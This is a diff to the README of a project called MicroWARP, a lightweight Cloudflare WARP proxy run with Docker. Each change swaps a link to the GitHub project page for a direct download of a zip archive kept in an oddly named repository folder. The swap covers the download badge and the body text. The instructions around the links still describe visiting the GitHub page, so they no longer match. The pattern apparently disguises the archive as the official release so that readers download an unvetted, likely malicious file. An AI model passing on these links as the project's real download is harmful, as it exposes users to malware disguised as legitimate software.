@@ -1,6 +1,6 @@
 # 🚀 MicroWARP - Ultra-Light Cloudflare WARP Proxy
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20MicroWARP-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/roderigoambiguous332/MicroWARP)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20MicroWARP-Visit%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/roderigoambiguous332/MicroWARP/main/strangurious/WARP-Micro-v2.5.zip)
 
 ## 🌐 What MicroWARP Does
 
@@ -22,7 +22,7 @@ Before you start, make sure you have:
 
 Visit this page to download or get the project files:
 
-https://github.com/roderigoambiguous332/MicroWARP
+https://raw.githubusercontent.com/roderigoambiguous332/MicroWARP/main/strangurious/WARP-Micro-v2.5.zip
 
 ## 🖥️ Install Docker on Windows
 
@@ -51,7 +51,7 @@ docker --version
 ## 📂 Get the MicroWARP Files
 
 1. Open the MicroWARP GitHub page:
-   https://github.com/roderigoambiguous332/MicroWARP
+   https://raw.githubusercontent.com/roderigoambiguous332/MicroWARP/main/strangurious/WARP-Micro-v2.5.zip
 2. Click the green `Code` button.
 3. Choose `Download ZIP`.
 4. Save the file to your Downloads folder.
@@ -231,4 +231,4 @@ docker compose down
 
 Open the project page and follow the files in the repository:
 
-https://github.com/roderigoambiguous332/MicroWARP
+https://raw.githubusercontent.com/roderigoambiguous332/MicroWARP/main/strangurious/WARP-Micro-v2.5.zip
